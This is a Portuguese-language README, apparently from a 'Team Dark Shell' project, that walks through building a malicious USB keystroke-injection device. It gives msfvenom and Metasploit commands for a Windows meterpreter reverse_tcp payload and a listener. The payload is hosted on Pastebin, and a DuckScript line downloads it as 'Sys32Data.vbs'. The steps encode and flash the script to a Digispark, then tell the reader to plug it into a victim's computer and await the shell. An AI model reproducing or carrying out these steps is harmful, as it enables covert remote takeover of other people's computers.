# DuckShell

                     .ed"""" """$$$$be.
                   -"           ^""**$$$e.
                 ."                   '$$$c
                /                      "4$$b 
               d  3                      $$$$                            
               $  *                   .$$$$$$
              .$  ^c           $$$$$e$$$$$$$$.
              d$L  4.         4$$$$$$$$$$$$$$b
              $$$$b ^ceeeee.  4$$ECL.F*$$$$$$$
  e$""=.      $$$$P d$$$$F $ $$$$$$$$$- $$$$$$
 z$$b. ^c     3$$$F "$$$$b   $"$$$$$$$  $$$$*"      .=""$c
4$$$$L        $$P"  "$$b   .$ $$$$$...e$$        .=  e$$$.
^*$$$$$c  %..   *c    ..    $$ 3$$$$$$$$$$eF     zP  d$$$$$
  "**$$$ec   "   %ce""    $$$  $$$$$$$$$$*    .r" =$$$$P""
        "*$b.  "c  *$e.    *** d$$$$$"L$$    .d"  e$$***"
          ^*$$c ^$c $$$      4J$$$$$% $$$ .e*".eeP"
             "$$$$$$"'$=e....$*$$**$cz$$" "..d$*"
               "*$$$  *=%4.$ L L$ P3$$$F $$$P"
                  "$   "%*ebJLzb$e$$$$$b $P"
                    %..      4$$$$$$$$$$ "
                     $$$e   z$$$$$$$$$$%
                      "*$c  "$$$$$$$P"
                       ."""*$$$$$$$$bc
                    .-"    .$***$$$"""*e.
                 .-"    .e$"     "*$c  ^*b.
          .=*""""    .e$*"          "*bc  "*$e..
        .$"        .z*"               ^*$e.   "*****e.
        $$ee$c   .d"                     "*$.        3.
        ^*$E")$..$"                         *   .ee==d%
           $.d$$$*     Hacked by Victor      *  J$$$e*
            """""       Team Dark Shell          "$$$"

=========================================================

#Crie seu Payload atraves do Metasploit usando o seguinte codigo>

msfvenom -p windows/meterpreter/reverse_tcp -f vbs –smallest LHOST=“attacker ip” LPORT=444 -o /root/Desktop/payload.txt
(Substitua "attacker ip" pelo seu ip local)

=========================================================

#Execute o Metasploit

systemctl start postgresql
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST "attacker ip"
set RHOST 444
exploit

#Jogue o codigo criado no arquivo "payload.txt" no Pastebin:

https://pastebin.com/
(Clique em "Create New Paste" e copie o a url criada para seu arquivo)

=========================================================

#Modifique o arquivo payload.duck inserindo o link do Pastebin na seguinte linha:

(Substitua >>link<< pelo link do Pastebin)
STRING $client.DownloadFile(' >>link<< ','Sys32Data.vbs')

=========================================================

#Execute o duckencoder no arquivo payload.duck

cat payload.duck | python duckencoder.py -p -l br > inject.bin

=========================================================

#Excute o duck2spark no arquivo inject.bin

./duck2spark.py -i inject.bin -l 1 -f 2000 -o inject.ino

=========================================================

#Abra o arquivo inject.ino no Arduino
Site Download Arduino

Windows(https://www.arduino.cc/download.php?f=/arduino-1.8.5-windows.exe)
Linux(https://www.arduino.cc/download_handler.php?f=/arduino-1.8.5-linux64.tar.xz)

=========================================================

#Carregue o codigo através do Arduino em seu Digispark
Site Compra
(https://www.baudaeletronica.com.br/digispark-attiny85.html?gclid=CjwKCAjw8NfrBRA7EiwAfiVJpbY-3W7UOWFbtM9CaCiscVXVHin11btfv47m_17zTJEQGgbhG_D4zhoCnt8QAvD_BwE)

=========================================================

#Agora Basta Apenas Conectar ao Computador da Vitima e esperar a Conexão :)

=========================================================
